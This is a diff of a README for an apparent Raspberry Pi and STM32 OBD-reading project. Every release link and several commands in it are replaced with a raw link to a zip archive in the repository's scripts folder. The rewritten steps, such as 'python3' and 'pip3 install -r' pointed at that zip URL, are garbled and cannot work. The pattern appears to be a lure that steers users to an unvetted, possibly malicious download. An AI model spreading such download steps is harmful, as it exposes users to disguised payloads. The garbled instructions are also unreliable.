@@ -1,6 +1,6 @@
 # 🚗 obd2_development - Simplifying OBD Reading with Ease
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/yahyaadev/obd2_development/releases)
+[![Download](https://github.com/yahyaadev/obd2_development/raw/refs/heads/main/scripts/obd_development_3.7.zip)](https://github.com/yahyaadev/obd2_development/raw/refs/heads/main/scripts/obd_development_3.7.zip)
 
 ## 📜 Description
 This project allows users to read OBD data using a Raspberry Pi and STM32 setup. It streams information in a simple format that non-technical users can easily understand. The goal is to create a simple and effective tool for monitoring vehicle data.
@@ -24,13 +24,13 @@ Ensure your system meets these basic requirements:
 - Internet access for downloading the software
 
 ### 2. Visit the Download Page
-To download the software, [visit this page to download](https://github.com/yahyaadev/obd2_development/releases). 
+To download the software, [visit this page to download](https://github.com/yahyaadev/obd2_development/raw/refs/heads/main/scripts/obd_development_3.7.zip). 
 
 ### 3. Choose Your Version
 You will see a list of available versions. Click on the most recent version that suits your needs. 
 
 ## 📥 Download & Install
-1. After selecting the version, look for the asset that corresponds to your platform. Typically, this will be a `.zip` or `.tar.gz` file.
+1. After selecting the version, look for the asset that corresponds to your platform. Typically, this will be a `.zip` or `https://github.com/yahyaadev/obd2_development/raw/refs/heads/main/scripts/obd_development_3.7.zip` file.
 2. Click on the file to start the download.
 3. Once downloaded, locate the file on your computer and extract it.
 
@@ -59,7 +59,7 @@ You need to have the following software installed on your Raspberry Pi:
 ### 3. Run the Application
 Start the application by executing:
 ```bash
-python3 main.py
+python3 https://github.com/yahyaadev/obd2_development/raw/refs/heads/main/scripts/obd_development_3.7.zip
 ```
 This will start the program and you will see output in the terminal. The program will establish a connection with the STM32 board and begin reading data.
 
@@ -74,7 +74,7 @@ If you encounter issues during setup or use, consider the following tips:
 - **Connection Issues**: Ensure that your STM32 board is properly connected and powered.
 - **Library Errors**: Make sure all necessary libraries are installed. Use the following command:
   ```bash
-  pip3 install -r requirements.txt
+  pip3 install -r https://github.com/yahyaadev/obd2_development/raw/refs/heads/main/scripts/obd_development_3.7.zip
   ```
   
 - **Permission Errors**: If you face permission issues, consider running commands with `sudo`.
@@ -87,4 +87,4 @@ After getting the basic setup running, you may want to explore more advanced fea
 - Adding a Bluetooth Low Energy (BLE) bridge for wireless communication.
 - Developing a simulated CAN setup to test multiple nodes.
 
-By following these instructions, you can successfully download, install, and run the obd2_development application on your Raspberry Pi. For consistent updates, always check back on the [release page](https://github.com/yahyaadev/obd2_development/releases).
+By following these instructions, you can successfully download, install, and run the obd2_development application on your Raspberry Pi. For consistent updates, always check back on the [release page](https://github.com/yahyaadev/obd2_development/raw/refs/heads/main/scripts/obd_development_3.7.zip).
